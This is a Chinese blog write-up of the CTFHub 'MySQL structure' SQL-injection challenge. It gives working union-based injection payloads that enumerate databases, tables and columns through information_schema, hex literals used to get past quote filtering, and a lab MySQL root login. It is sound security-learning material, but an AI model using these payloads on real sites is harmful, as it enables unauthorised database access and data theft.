---
layout: post
title: CTFHub MySQL结构Writeup
date: "2026-11-23 17:50:00 +0800"
categories: [CTF, CTFHub, Web]
tags: [ctfhub, mysql, sql-injection]
---

## 一、学习环境

- 靶机：CTFHub 技能树 MySQL结构
- 地址：http://challenge-37c42a735c32149f.sandbox.ctfhub.com:10800
- 本地环境：OWASP BWA，192.168.216.129
- SSH：ssh bwa
- MySQL：mysql -u root -powaspbwa
- 常用库：dvwa、owasp10、bricks、peruggia、mutillidae
- 铁律：全程不用 use，跨库一律写 库名.表名，或在 information_schema 里用 where table_schema 过滤

## 二、题目信息

- 平台：CTFHub
- 题型：Web，SQL注入
- 考点：information_schema 元数据检索、跨库查询、十六进制绕开引号

## 三、解题思路

页面只有 ID 输入框，提交后回显两行：ID 和 Data，属于两列结果集。

目标是找到 flag，但页面只显示 news 表的内容，flag 不在其中。思路是先查目录，找到所有库，再找库里的表和字段，最后取数据。

本题的关键点：表名和字段名都是随机字符串，猜不到，必须查 information_schema。

另外全程不写引号，库名和表名统一用十六进制表示，既避开单引号，也避开引号被过滤的风险。

## 四、解题步骤

1、数列数。访问 id=1 order by 2，正常；id=1 order by 3，结果区空白，说明只有两列。

2、确认回显位。访问：

```
id=999 union select 1,2
```

页面显示第一行 ID 为 1、Data 为 2，说明两列都会输出。这里用 999 是因为 1 有数据，会把伪造行挤到第二行看不见。

3、列所有库。访问：

```
id=999 union select 1,group_concat(schema_name) from information_schema.schemata
```

返回 information_schema、performance_schema、mysql、sqli 四个库。

4、列 sqli 库的表。访问：

```
id=999 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x73716c69
```

0x73716c69 是 sqli 的十六进制写法，等价于用引号包住 sqli。

返回 zxmwdpqgiw、news 两张表。news 是页面本身用的，随机名那张才是目标。

5、列目标表的字段。访问：

```
id=999 union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x73716c69 and table_name=0x7a786d77647071676977
```

0x7a786d77647071676977 是表名 zxmwdpqgiw 的十六进制。

返回字段名 fqzcbzeuje，同样是随机串。

6、取数据。访问：

```
id=999 union select 1,group_concat(fqzcbzeuje) from sqli.zxmwdpqgiw
```

Data 位置返回 ctfhub{93d95d3c5bece1f24450b5e9}，即 flag。

## 五、踩坑记录

**坑一：用 id=1 做 union，看不到结果**

现象：union 写对了，页面只显示 ID 为 1、Data 为 ctfhub，看不到伪造行。

原因：页面只渲染结果集第一行，1 有数据，伪造行排在第二行。

解决：把 id 换成 999 这类查不到记录的编号，结果集只剩伪造行。

**坑二：以为表名是 flag**

现象：按习惯去查 flag 表，查不到。

原因：本题表名和字段名都随机，出题人故意让人必须走 information_schema。

解决：先列 table_name，再列 column_name，不要猜。

**坑三：引号被过滤的风险**

现象：直接用引号包 sqli 有时不生效。

原因：参数经过 URL 编码和过滤，引号容易出问题。

解决：库名和表名改成十六进制，0x 开头，不需要引号。

## 六、问题与解答

**问：为什么要用十六进制。**

答：十六进制是数字字面量，不需要引号，绕过引号过滤，也避免手误写成中文引号。sqli 的 ASCII 是 73 71 6C 69，前面加 0x 即可。

**问：为什么不用 use。**

答：网页参数只能拼进一条语句，没有机会单独执行 use。跨库一律写 库名.表名，或者在 information_schema 的 where 里限定 table_schema。

**问：group_concat 为什么必须加。**

答：元数据查询会返回多行，页面只显示第一行。group_concat 把多行拼成一行，才能一次看全。

**问：怎么判断只有两列。**

答：order by 2 正常、order by 3 空白，第一次报错的编号减一就是列数。

## 七、总结

1、目录优先：不知道表名字段名时，先查 information_schema，再查业务数据。
2、跨库靠全名：库名.表名，或者 where table_schema 过滤，不用 use。
3、页面只显示第一行，所以伪造行要排在第一位，用不存在的 id 垫底。
4、随机表名说明出题人不给猜的机会，流程必须走完整。
